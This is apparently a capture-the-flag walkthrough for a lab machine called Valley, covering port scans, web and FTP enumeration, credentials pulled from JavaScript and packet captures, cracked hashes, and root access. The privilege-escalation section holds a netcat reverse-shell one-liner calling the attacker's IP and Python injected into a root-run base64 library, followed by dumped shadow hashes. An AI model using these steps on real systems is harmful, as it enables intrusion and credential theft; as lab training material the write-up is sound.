# Recon

### Rustscan

```
docker run rustscan/rustscan -a 10.10.144.208 | tee /opt/THM/Valley/1-recon/rustscan_init.md
```

```
Open 10.10.144.208:22
Open 10.10.144.208:80
Open 10.10.144.208:37370
```
### Nmap


```bash
nmap -vvv -Pn -sC -sV -oN /opt/THM/Valley/1-recon/nmap/nmap_init.md 10.10.144.208
```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
nmap -vvv -Pn -sC -sV -A -p 37370 -oN /opt/THM/Valley/1-recon/nmap/nmap_agress_37370.md 10.10.144.208
```

```
PORT      STATE SERVICE REASON  VERSION
37370/tcp open  ftp     syn-ack vsftpd 3.0.3
Service Info: OS: Unix
```

# Enumeration

### FTP Part 1

ftp anon login

```
ftp 10.10.144.208 37370
```

no allowed

```
Connected to 10.10.144.208.
220 (vsFTPd 3.0.3)
Name (10.10.144.208:devel): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```


### Web 

http://10.10.144.208

![[web80.png]]

```
gobuster dir -u http://10.10.144.208:80 -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/Valley/2-enum/web/gob_dir_big.md
```


```
gobuster dir -u http://10.10.144.208:80/gallery -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/Valley/2-enum/web/gob_dir_big_gallery.md
```

```
gobuster dir -u http://10.10.144.208:80/static -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/Valley/2-enum/web/gob_dir_big_static.md
```


```
gobuster dir -u http://10.10.144.208:80/pricing -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/Valley/2-enum/web/gob_dir_big_pricing.md
```

http://10.10.144.208:80/static

getting alot of new directories

```
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/00                   (Status: 200) [Size: 127]
/11                   (Status: 200) [Size: 627909]
/10                   (Status: 200) [Size: 2275927]
/12                   (Status: 200) [Size: 2203486]
/18                   (Status: 200) [Size: 2036137]
/1                    (Status: 200) [Size: 2473315]
/17                   (Status: 200) [Size: 3551807]
/13                   (Status: 200) [Size: 3673497]
/14                   (Status: 200) [Size: 3838999]
/16                   (Status: 200) [Size: 2468462]
/15                   (Status: 200) [Size: 3477315]
/3                    (Status: 200) [Size: 421858]
/5                    (Status: 200) [Size: 1426557]
/2                    (Status: 200) [Size: 3627113]
/6                    (Status: 200) [Size: 2115495]
/4                    (Status: 200) [Size: 7389635]
/9                    (Status: 200) [Size: 1190575]
/7                    (Status: 200) [Size: 5217844]
/8                    (Status: 200) [Size: 7919631]
```

make a custom wordlist for all 2 digit numbers

```bash
seq -w 00 99 > numbers.txt
```

fuzz that directory

```
ffuf -v -w numbers.txt -u http://10.10.144.208:80/static/FUZZ -o /opt/THM/Valley/2-enum/web/ffuf_static.md
```

```
00                      [Status: 200, Size: 127, Words: 15, Lines: 6, Duration: 100ms]
11                      [Status: 200, Size: 627909, Words: 2055, Lines: 2130, Duration: 102ms]
18                      [Status: 200, Size: 2036137, Words: 7704, Lines: 8326, Duration: 100ms]
12                      [Status: 200, Size: 2203486, Words: 8505, Lines: 9816, Duration: 107ms]
16                      [Status: 200, Size: 2468462, Words: 9883, Lines: 9004, Duration: 107ms]
10                      [Status: 200, Size: 2275927, Words: 8654, Lines: 8780, Duration: 101ms]
17                      [Status: 200, Size: 3551807, Words: 12976, Lines: 13072, Duration: 107ms]
15                      [Status: 200, Size: 3477315, Words: 13107, Lines: 14243, Duration: 111ms]
14                      [Status: 200, Size: 3838999, Words: 13327, Lines: 16033, Duration: 109ms]
13                      [Status: 200, Size: 3673497, Words: 13878, Lines: 16580, Duration: 108ms]
```


http://10.10.144.208/static/00

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

![[valley_login.png]]

view-source:http://10.10.144.208/dev1243224123123/

strange js file

```
<script defer src="[dev.js](view-source:http://10.10.144.208/dev1243224123123/dev.js)"></script>
```

http://10.10.144.208/dev1243224123123/dev.js

```
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})

```

credentials

```
siemDev
california
```

does not work for web page

### FTP Part 2

credentials

```
siemDev
california
```


```
Connected to 10.10.144.208.
220 (vsFTPd 3.0.3)
Name (10.10.144.208:devel): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

some pcap files

```
ftp> ls -la
229 Entering Extended Passive Mode (|||47120|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
```


getting them

```
wget -m --user=siemDev --password=california ftp://10.10.144.208:37370
```

### Network Analysis


opening the pcap files in wireshark

siemFTP pcap

![[ftppcap.png]]


```
220 (vsFTPd 3.0.3)

USER anonymous

331 Please specify the password.

PASS anonymous

230 Login successful.

SYST

215 UNIX Type: L8

FEAT

211-Features:

EPRT

EPSV

MDTM

PASV

REST STREAM

SIZE

TVFS

211 End

EPSV

229 Entering Extended Passive Mode (|||20349|)

LIST

150 Here comes the directory listing.

226 Directory send OK.

EPSV

229 Entering Extended Passive Mode (|||6658|)

NLST

150 Here comes the directory listing.

226 Directory send OK.

QUIT

221 Goodbye.
```


this is not helpful as the anonymous ftp login does not work


siemHTTP1 pcap seems to just be some external (out of scope) testing website, only get requests nothing interesting

http2

not interested in get requests, looking for login attempts on the site, so posts requests

```
http.request.method==POST
```

![[http2post.png]]

from that stream we get a snippet containing 

```
POST /index.html HTTP/1.1

Host: 192.168.111.136

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 42

Origin: http://192.168.111.136

Connection: keep-alive

Referer: http://192.168.111.136/index.html

Upgrade-Insecure-Requests: 1

  

uname=valleyDev&psw=ph0t0s1234&remember=onHTTP/1.1 200 OK
```

credentials

```
valleyDev
ph0t0s1234
```
# Privilege Escalation

### valley from valleyDev

going back to the web login and attempting

http://10.10.144.208/dev1243224123123/

does not work - try ssh service?

```
ssh valleyDev@10.10.144.208
ph0t0s1234
```

auth successful

```
valleyDev@10.10.144.208's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ whoami
valleyDev
valleyDev@valley:~$ uname -a
Linux valley 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

/home/valleyDev/user.txt

```
THM{k@l1_1n_th3_v@lley}
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
tomcat:x:998:998::/opt/tomcat:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
valley:x:1000:1000:,,,:/home/valley:/bin/bash
siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash
ftp:x:128:135:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
fwupd-refresh:x:124:130:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

```
cat /etc/crontab
```


interesting cron job

```
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```


owned by root

```
-rwxr-xr-x 1 root root 621 Mar  6  2023 /photos/script/photosEncrypt.py
```


```
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

strange executable in /home

```
/home/valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
```


```
scp -i valley_persis.rsa valleyDev@valley.thm:/home/valleyAuthenticator .

```

```
strings valleyAuthenticator
```

towards the bottom of the file
```
 -\(
UPX!
UPX!
```

```
upx -d valleyAuthenticator
```

```
Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2290962 <-    749128   32.70%   linux/amd64   valleyAuthenticator

Unpacked 1 file.
```

grep for strings with  10 chars or more

```
strings valleyAuthenticator | grep -P '[\S]{10,}'
```

still not right, is there a password in there?

```
strings valleyAuthenticator | grep -i "pass" 
```


```
What is your password: 
Wrong Password or Username
```

yes, now lets give some context to it, print 20 lines before this occurence and the following 20 lines

```
strings valleyAuthenticator | grep -i "pass" -B 20 -A 20
```


```
]A\
I9\$xv.I
T$pH
tKU1
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
basic_string::_M_construct null not valid
%02x
basic_string::_M_construct null not valid
terminate called recursively
  what():  
terminate called after throwing an instance of '
terminate called without an active exception
basic_string::append
```

seems like a login attempt and these look like the credentials hashed

```
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
```


```
https://hashes.com/en/decrypt/hash
```


```
e6722920bab2326f8217e4bf6b1b58ac:liberty123
dd2921cc76ee3abfd2beb60709056cfb:valley
```

logging into the valley user

```
valleyDev@valley:/dev/shm$ whoami
valleyDev
valleyDev@valley:/dev/shm$ su valley
Password: 
valley@valley:/dev/shm$ whoami
valley
valley@valley:/dev/shm$ uname -a
Linux valley 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```


### Root from valley

we are in the valleyAdmin group

```
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```


```
╔══════════╣ Executable files potentially added by user (limit 70)
2023-03-06+15:43:32.8105266440 /photos/script/photosEncrypt.py

```


```
-rwxr-xr-x 1 root root 621 Mar  6  2023 /photos/script/photosEncrypt.py
```

again looking at that script

```
import base64
...
# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)
```


```
locate bas64
/usr/lib/python3.8/base64.py
```


we can write to this library file

```
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```

so how to take advantage

given the cronjob, photos script runs every minute by root user
the photos script uses bas64 library during encoding, specifically base64.b64encode()

given that we can modify bas64.py, we might be able to spawn a reverse shell

we have netcat on the system

```
which nc
/usr/bin/nc
```

our reverse shell using netcat that points back to our target machine

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1337 >/tmp/f
```

we don't need to make a whole new library file. when the python library file is called, it is executed

we can inject python code into the library file to execute the reverse shell when the library file is loaded from the photos python script from the cronjob

the python code to inject

```
import os
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1337 >/tmp/f')
```

```
nano /usr/lib/python3.8/base64.py
```


![[pyinject.png]]

start a listener on attacker machine

```
nc -lvnp 1337
```

get a hit

```
listening on [any] 1337 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.144.208] 49624
sh: 0: can't access tty; job control turned off
# whoami 
root
# uname -a
Linux valley 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
# sudo -l
Matching Defaults entries for root on valley:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on valley:
    (ALL : ALL) ALL
# 
```

/root/root.txt

```
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```


/etc/shadow

```
root:$6$fZFj0HVMgSFos0ip$YfOYlkrmWG1XYSfd/C3Hn9mdPcyZzErNFFFHbgqRBMXn09cRegpaP8kWB3iUGVlPiM/gejJt11dyVr4g1LXG31:19422:0:99999:7:::
daemon:*:19046:0:99999:7:::
bin:*:19046:0:99999:7:::
sys:*:19046:0:99999:7:::
sync:*:19046:0:99999:7:::
games:*:19046:0:99999:7:::
man:*:19046:0:99999:7:::
lp:*:19046:0:99999:7:::
mail:*:19046:0:99999:7:::
news:*:19046:0:99999:7:::
uucp:*:19046:0:99999:7:::
proxy:*:19046:0:99999:7:::
www-data:*:19046:0:99999:7:::
backup:*:19046:0:99999:7:::
list:*:19046:0:99999:7:::
irc:*:19046:0:99999:7:::
gnats:*:19046:0:99999:7:::
nobody:*:19046:0:99999:7:::
systemd-network:*:19046:0:99999:7:::
systemd-resolve:*:19046:0:99999:7:::
systemd-timesync:*:19046:0:99999:7:::
messagebus:*:19046:0:99999:7:::
syslog:*:19046:0:99999:7:::
_apt:*:19046:0:99999:7:::
tss:*:19046:0:99999:7:::
uuidd:*:19046:0:99999:7:::
tcpdump:*:19046:0:99999:7:::
avahi-autoipd:*:19046:0:99999:7:::
usbmux:*:19046:0:99999:7:::
rtkit:*:19046:0:99999:7:::
dnsmasq:*:19046:0:99999:7:::
cups-pk-helper:*:19046:0:99999:7:::
speech-dispatcher:!:19046:0:99999:7:::
avahi:*:19046:0:99999:7:::
kernoops:*:19046:0:99999:7:::
saned:*:19046:0:99999:7:::
nm-openvpn:*:19046:0:99999:7:::
hplip:*:19046:0:99999:7:::
whoopsie:*:19046:0:99999:7:::
colord:*:19046:0:99999:7:::
geoclue:*:19046:0:99999:7:::
pulse:*:19046:0:99999:7:::
sssd:*:19046:0:99999:7:::
systemd-coredump:!!:19215::::::
tomcat:!:19219::::::
sshd:*:19219:0:99999:7:::
valley:$6$CQTaujDFf5F8h01J$P/t5lFRO04rBSDX1LZjtJk8Z8hHgm04omNlGZNi7atNx8D9rdtWGhkO6ZIDbwRvWJ0S8PAbvcHIsSRuD5A8qY1:19219:0:99999:7:::
mysql:!:19419:0:99999:7:::
siemDev:$6$fR.iTZ50e43fvA54$BQhrVoEnsN7bnoQxtjZId2OKUMtT1iy7zoRUYysNwR8a5y.6YzVJpm3BnWgB9vaIySKamPVkvgsL85o13VCdv0:19423:0:99999:7:::
valleyDev:$6$zlXo7.3.SJ3kOpj7$LdnuI03rJA22PT2p7TCEH0PIk4olUT.RUpwuC4M10WIyuZNas1TDSEiWKfsfVYiPaUswMq7yUdwJYwdHpAhx31:19422:0:99999:7:::
ftp:*:19423:0:99999:7:::
fwupd-refresh:*:19436:0:99999:7:::
```